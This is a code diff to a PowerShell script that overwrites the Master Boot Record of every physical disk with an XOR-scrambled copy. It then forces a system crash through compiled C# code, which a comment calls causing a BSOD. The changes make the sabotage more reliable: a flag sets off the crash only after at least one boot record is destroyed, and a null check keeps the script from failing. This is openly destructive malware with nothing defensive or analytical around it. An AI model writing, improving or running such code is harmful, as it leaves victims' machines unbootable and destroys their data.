@@ -11,6 +11,7 @@ $drives = Get-CimInstance -ClassName Win32_DiskDrive
 
 # XOR encryption key
 $key = 0x55
+$mbrOverwritten = $false  # Flag to track if any MBR was successfully modified
 
 foreach ($drive in $drives) {
     $diskPath = "\\.\" + $drive.DeviceID
@@ -34,16 +35,22 @@ foreach ($drive in $drives) {
         $fs.Seek(0, [IO.SeekOrigin]::Begin)
         $fs.Write($mbr, 0, 512)
 
+        # Mark that at least one MBR was successfully overwritten
+        $mbrOverwritten = $true
+        Write-Host "Successfully encrypted MBR on $diskPath"
+
     } catch {
         Write-Host "Failed to process $diskPath - $_"
     } finally {
         # Close the file stream
-        $fs.Dispose()
+        if ($fs) { $fs.Dispose() }
     }
 }
 
-# Cause BSOD using Add-Type
-$source = @"
+# Only execute Add-Type if at least one MBR was modified
+if ($mbrOverwritten) {
+
+    $source = @"
 using System;
 using System.Runtime.InteropServices;
 
@@ -66,3 +73,4 @@ public static class CS {
     $comparams.CompilerOptions = '/unsafe'
     Add-Type -TypeDefinition $source -Language CSharp -PassThru -CompilerParameters $comparams
     [CS]::Kill()
+}
